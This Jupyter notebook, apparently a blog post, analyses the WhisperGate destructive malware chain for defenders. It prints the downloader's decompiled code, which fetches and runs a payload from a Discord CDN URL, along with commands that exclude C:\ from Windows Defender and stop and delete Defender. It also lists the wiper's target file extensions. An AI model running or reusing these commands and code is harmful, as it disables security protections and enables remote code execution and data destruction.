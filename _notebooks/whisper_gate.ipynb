{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f034cbce-0161-47c4-804d-c10d660f00c1",
   "metadata": {},
   "source": [
    "# WhisperGate Malware\n",
    "> Analysis of the WhisperGate malware delivery chain\n",
    "\n",
    "- toc: true \n",
    "- badges: true\n",
    "- categories: [whispergate,malware]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e5304603-38f7-4a65-b3e1-ec0e17f5a787",
   "metadata": {},
   "source": [
    "## Overview\n",
    "\n",
    "Stage 1 - MBR Wiper: `a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92`\n",
    "\n",
    "Stage 2 - Downloader: `dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78`\n",
    "\n",
    "Stage 3 - File Corruptor (injector): `9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d`\n",
    "\n",
    "Stage 4 - Final (unpacked on stream): `34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907`\n",
    "\n",
    "All samples on available on [Malshare](https://malshare.com/search.php).\n",
    "\n",
    "**References:**\n",
    "- [Elastic Security Research - Operation Bleeding Bear](https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/)\n",
    "- [S2W TALON - Analysis of Destructive Malware (WhisperGate) targeting Ukraine](https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3)\n",
    "- [Stage 1 - Analysis From Hexorcist (YouTube)](https://www.youtube.com/watch?v=2nd-f1dIfD4)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce2ae6b1-0750-466d-ba41-a1a1f66a0e94",
   "metadata": {
    "tags": []
   },
   "source": [
    "## Stage 2 - Downloader\n",
    "\n",
    "This is a .NET binary that is obfuscated with **NetReactor**. We can use [NetReactorSlayer](https://github.com/SychicBoy/NetReactorSlayer) to remove the obfuscation. Just drag the binary over and `yes` to all options.\n",
    "\n",
    "**TODO:** Find a way to identify NetReactor obfuscation -- is there a signature for it? \n",
    "[List of .NET de-obfuscation tools](https://github.com/NotPrab/.NET-Deobfuscator)\n",
    "\n",
    "### Functionality\n",
    "- Download **Stage3** binary from Discord \n",
    "- Binary is downloaded as `Tbopbh.jpg` and is reversed\n",
    "- Reverse binary and load it directly as a .NET assembly \n",
    "- Call `Ylfwdwgmpilzyaph` method from loaded **Stage3** .NET assembly \n",
    "\n",
    "### Sample Functions\n",
    "```csharp\n",
    "private static byte[] ChangeFacade()\n",
    "\t{\n",
    "\t\tFacade.ReflectFacade();\n",
    "\t\ttry\n",
    "\t\t{\n",
    "\t\t\tServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;\n",
    "\t\t}\n",
    "\t\tcatch\n",
    "\t\t{\n",
    "\t\t}\n",
    "\t\tbyte[] array = (byte[])typeof(WebClient).GetMethod(\"DxownxloxadDxatxxax\".Replace(\"x\", \"\"), new Type[]\n",
    "\t\t{\n",
    "\t\t\ttypeof(string)\n",
    "\t\t}).Invoke(new WebClient(), new object[]\n",
    "\t\t{\n",
    "\t\t\t\"https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg\"\n",
    "\t\t});\n",
    "\t\tif (array.Length > 1)\n",
    "\t\t{\n",
    "\t\t\tArray.Reverse(array, 0, array.Length);\n",
    "\t\t}\n",
    "\t\treturn array;\n",
    "\t}\n",
    "\n",
    "private static void FillFacade(MethodInfo[] spec)\n",
    "\t{\n",
    "\t\tforeach (MethodInfo methodInfo in spec)\n",
    "\t\t{\n",
    "\t\t\tif (methodInfo.Name == \"Ylfwdwgmpilzyaph\")\n",
    "\t\t\t{\n",
    "\t\t\t\tmethodInfo.Invoke(null, null);\n",
    "\t\t\t}\n",
    "\t\t}\n",
    "\t}\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "25016081-8be8-48bb-bdb6-6cca829bf82e",
   "metadata": {},
   "source": [
    "## Stage 3 - File Corruptor (Injector)\n",
    "\n",
    "This is a .NET binary that appears to be obfuscated with **Eazfuscator** and we know from **Stage2** that it is loaded as a .NET assembly and the method `Ylfwdwgmpilzyaph` is where the code starts. Because it is loaded as an assembly it doesn't have an entrypoint and cannot be launched directly like a regular PE file.  \n",
    "\n",
    "For **Eazfuscator** we can try some tools like de4dot and [EazFizer](https://github.com/HoLLy-HaCKeR/EazFixer) but they all fail because Eazfuscator has actually **virtualized** the functions. We need to do this dynamically.\n",
    "\n",
    "### Analysis and Unpacking\n",
    "- Open module in dnspy\n",
    "- Right click assembly `Edit Module...`\n",
    "- Change Module Type to `Windows` and add `Ylfwdwgmpilzyaph` as the Managed Entry Point.\n",
    "- File -> Save Module\n",
    "- Open saved module in dnspy\n",
    "- Locate call to EazFusactor vm in entrypoint\n",
    "```csharp\n",
    "\\u0005\\u2005\\u2000.\\u000E\\u2005\\u2000().\\u0002(\\u0005\\u2005\\u2000.\\u000F\\u2005\\u2000(), \"#6k@H!uq=A\", null);\n",
    "```\n",
    "- Press ctrl+f to open find and search for `.invoke`\n",
    "- When you find the function with the two invokes on the entrypoint \"call\" put a breakpoint on them.\n",
    "```csharp\n",
    "return \\u0002.Invoke(\\u0003, \\u0005);\n",
    "return ((ConstructorInfo)\\u0002).Invoke(BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic, null, \\u0005, null)\n",
    "```\n",
    "- Start debugger\n",
    "\n",
    "The concept behind this method is that Eazfuscator uses the `invoke` each time it calls into a virtualized function. By putting a breakpoint here we can monitor and intercept the arguments for each call. Each time we break we can inspect the arguments then run until we break again at the next call.\n",
    "\n",
    "### Functionality \n",
    "- The sample checks if it is running as admin, if it isn't it will launch itself again elevated and teminate. \n",
    "- The sample drops a VBS script `%TEMP%\\Nmddfrqqrbyjeygggda.vbs` that attempts to exclude `C:\\` from Windows Defender \n",
    "```vbnet\n",
    "CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell Set-MpPreference -ExclusionPath 'C:\\'\"\", 0, False\n",
    "```\n",
    "- Drops `AdvancedRun.exe` in `%TEMP%`  (SHA256: `29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b`)\n",
    "- Attempts to stop Windows Defender \n",
    "```bat\n",
    "/EXEFilename C:\\Windows\\System32\\sc.exe /WindowState 0 /CommandLine \"\"stop WinDefend\"\"  /StartDirectory \"\"\"\" /RunAs 8 /Run\n",
    "/EXEFilename C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /WindowState 0 /CommandLine \"\"rmdir 'C:\\ProgramData\\Microsoft\\Windows Defender' -Recurse\"\" /StartDirectory \"\"\"\" /RunAs 8 /Run\n",
    "```\n",
    "- Copy `InstallUtil.exe` into `%TEMP%` and launch it\n",
    "- Unpack **Stage4** which is reversed and gzipped\n",
    "- Inject **Stage4** into `InstallUtil.exe`"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4436aadb-dbee-4726-91d4-d7542da4f016",
   "metadata": {},
   "source": [
    "### Helpful Eazfuscator Concepts\n",
    "\n",
    "#### Create EXE From Assembly (Add Entrypoint)\n",
    "<video width=\"700px\" controls src=\"https://user-images.githubusercontent.com/5906222/150442537-f8cb4009-766d-43e1-b6a9-6239ae734daa.mp4\">\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08b0d177-b752-4151-92ec-5c91dbc750fa",
   "metadata": {},
   "source": [
    "\n",
    "#### Add Function Call Breakpoint To EazFusactor\n",
    "<video width=\"700px\" controls src=\"https://user-images.githubusercontent.com/5906222/150442567-ab829f55-b83a-4628-bd80-8801f5bf945d.mp4\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a77ad06-f1d8-42f3-a2fc-df67c277bfff",
   "metadata": {},
   "source": [
    "## Stage 4 - File Corruptor (Final)\n",
    "\n",
    "This is a 32bit native Windows binary that has been compiled with MinGW.\n",
    "\n",
    "### Functionality \n",
    "- Use `GetLogicalDrives` and interate through drives selecting FIXED and REMOTE drives\n",
    "- Recursively iterate through files in all directories except for `%HOMEDRIVE%\\Windows`\n",
    "- Compare the file extension against a list of target file extensions \n",
    "- For matching files replace the file contents with 0x100000 byes of `\\xcc`\n",
    "- Append a random hex integer to the corrupted file name \n",
    "\n",
    "### File Extension target list\n",
    "```cmd\n",
    ".HTML .HTM .SHTML .XHTML .PHTML .PHP .JSP .ASP .PHPS .PHP5 .ASPX .PHP4 .PHP6 .PHP7 .PHP3 .DOC .DOCX .XLS .XLSX .PPT .PPTX .PST .OST .MSG .EML .VSD .VSDX .TXT .CSV .RTF .WKS .WK1 .PDF .DWG .ONETOC2 .SNT .JPEG .JPG .DOCB .DOCM .DOT .DOTM .DOTX .XLSM .XLSB .XLW .XLT .XLM .XLC .XLTX .XLTM .PPTM .POT .PPS .PPSM .PPSX .PPAM .POTX .POTM .EDB .HWP .602 .SXI .STI .SLDX .SLDM .BMP .PNG .GIF .RAW .CGM .SLN .TIF .TIFF .NEF .PSD .AI .SVG .DJVU.SH .CLASS .JAR .BRD .SCH .DCH .DIP .PL .VB .VBS .PS1 .BAT .CMD .JS .ASM .H .PAS .CPP .C .CS .SUO .ASC .LAY6 .LAY .MML .SXM .OTG .ODG .UOP .STD .SXD .OTP .ODP .WB2 .SLK .DIF .STC .SXC .OTS .ODS .3DM .MAX .3DS .UOT .STW .SXW .OTT .ODT .PEM .P12 .CSR .CRT .KEY .PFX .DER .OGG .RB .GO .JAVA .INC .WAR .PY .KDBX .INI .YML .PPK .LOG .VDI .VMDK .VHD .HDD .NVRAM .VMSD .VMSN .VMSS .VMTM .VMX .VMXF .VSWP .VMTX .VMEM .MDF .IBD .MYI .MYD .FRM .SAV .ODB .DBF .DB .MDB .ACCDB .SQL .SQLITEDB .SQLITE3 .LDF .SQ3 .ARC .PAQ .BZ2 .TBK .BAK .TAR .TGZ .GZ .7Z .RAR .ZIP .BACKUP .ISO .VCD .BZ .CONFIG \n",
    "```\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f392321-96f1-4a81-a855-3c72cbe2b234",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
